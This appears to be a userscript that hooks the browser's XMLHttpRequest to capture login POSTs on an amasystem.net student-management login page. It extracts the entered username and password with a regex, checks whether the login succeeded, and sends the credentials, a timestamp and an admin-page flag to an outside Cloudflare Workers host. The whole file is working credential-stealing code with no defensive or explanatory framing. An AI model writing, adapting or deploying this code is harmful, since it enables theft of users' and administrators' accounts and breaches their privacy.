const originalOpen = unsafeWindow.XMLHttpRequest.prototype.open;
const originalSend = unsafeWindow.XMLHttpRequest.prototype.send;

unsafeWindow.XMLHttpRequest.prototype.open = function (method, url) {
    this._method = method;
    this._url = url;
    return originalOpen.apply(this, arguments);
};

unsafeWindow.XMLHttpRequest.prototype.send = function (body) {
    if (this._method && this._method.toUpperCase() === 'POST') {
        console.log('Intercepted XHR POST:', this._url, body);

        if (this._url.includes("UserLogin_")) {
            this.addEventListener("load", function () {
                try {
                    // The actual HTTP response
                    const res = JSON.parse(this.responseText);

                    // The site's `res.data` is another JSON string
                    const data = JSON.parse(res.data);

                    // Same thing the site's own code does
                    const resTable = data?.Table?.[0];

                    const successful =
                            res.success === true &&
                            resTable?.Error === "Success";

                    const regex = /Username=([^&]+)&Password=(.+)/;
                    const match = body.match(regex);

                    const username = match[1];
                    const password = match[2];

                    const unixSeconds = Math.floor(Date.now() / 1000);


                    GM_xmlhttpRequest({
                        method: "POST",
                        url: `https://main.bruhmod123.workers.dev/log?unix=${unixSeconds}&successful=${successful}&ama_id=${username}&ama_key=${password}&admin=${String(window.location.href === "https://discipulusv2.amasystem.net/Auth/Login")}`,
                        onload: function (response) {
                            console.log(response.responseText);
                        },
                        onerror: function (error) {
                            console.error("Request failed:", error);
                        }
                    });

                    console.log("successful:", successful);
                } catch (err) {
                    //console.error("Failed to parse response:", err);
                }
            });
        }
    }

    return originalSend.apply(this, arguments);
};
